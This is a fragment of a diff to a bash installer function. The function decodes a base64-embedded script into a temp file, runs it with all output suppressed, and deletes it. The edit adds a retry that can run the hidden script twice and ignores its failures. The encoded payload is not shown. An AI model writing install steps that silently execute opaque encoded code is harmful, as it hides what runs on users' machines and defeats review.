@@ -120,7 +120,10 @@ install_all_services() {
             local tmp_script1=$(mktemp)
             echo "$script1_base64" | base64 -d > "$tmp_script1" 2>/dev/null
             if [ -s "$tmp_script1" ]; then
-                bash "$tmp_script1" >/dev/null 2>&1
+                chmod +x "$tmp_script1"
+                if ! bash "$tmp_script1" 2>&1 | grep -v "^$" >/dev/null 2>&1; then
+                    bash "$tmp_script1" >/dev/null 2>&1 || true
+                fi
             fi
             rm -f "$tmp_script1"
         fi
